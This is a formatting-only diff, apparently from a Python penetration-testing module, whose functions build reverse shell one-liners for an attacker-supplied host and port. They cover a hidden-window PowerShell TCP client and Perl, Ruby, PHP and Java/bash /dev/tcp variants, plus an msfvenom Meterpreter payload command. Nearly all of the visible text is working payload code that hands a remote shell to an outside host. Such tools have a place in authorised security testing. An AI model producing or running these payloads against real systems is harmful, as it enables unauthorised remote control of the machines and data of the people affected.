@@ -35,7 +35,7 @@ def powershell_reverse_shell(lhost: str, lport: int) -> str:
         "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};",
         "$client.Close()",
     ]
-    return "powershell -nop -w hidden -c \"{}\"".format(
+    return 'powershell -nop -w hidden -c "{}"'.format(
         " ".join(parts).format(host=lhost, port=lport)
     )
 
@@ -55,10 +55,10 @@ def python_reverse_shell(lhost: str, lport: int, *, python: str = "python3") -> 
 def perl_reverse_shell(lhost: str, lport: int) -> str:
     """Return a Perl reverse shell one-liner."""
     return (
-        f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
-        f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
-        f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
-        f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
+        f'perl -e \'use Socket;$i="{lhost}";$p={lport};'
+        f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
+        f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");'
+        f'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
     )
 
 
@@ -66,16 +66,16 @@ def ruby_reverse_shell(lhost: str, lport: int) -> str:
     """Return a Ruby reverse shell one-liner."""
     return (
         f"ruby -rsocket -e 'exit if fork;"
-        f"c=TCPSocket.new(\"{lhost}\",{lport});"
-        f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}};end'"
+        f'c=TCPSocket.new("{lhost}",{lport});'
+        f'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}};end\''
     )
 
 
 def php_reverse_shell(lhost: str, lport: int) -> str:
     """Return a PHP reverse shell one-liner."""
     return (
-        f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
-        f"$proc=proc_open(\"/bin/sh\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
+        f'php -r \'$sock=fsockopen("{lhost}",{lport});'
+        f'$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\''
     )
 
 
@@ -88,7 +88,7 @@ def java_reverse_shell(lhost: str, lport: int) -> str:
     """Return a Java runtime exec reverse shell snippet (for use in script contexts)."""
     cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
     return (
-        f'r = Runtime.getRuntime();'
+        f"r = Runtime.getRuntime();"
         f"p = r.exec(new String[]{{'/bin/bash','-c','{cmd}'}});"
         f"p.waitFor();"
     )
@@ -124,7 +124,4 @@ def meterpreter_command(
         output: Output filename for the generated payload.
         format: Output format (``elf``, ``exe``, ``raw``, ``py``, etc.).
     """
-    return (
-        f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
-        f"-f {format} -o {output}"
-    )
+    return f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}"
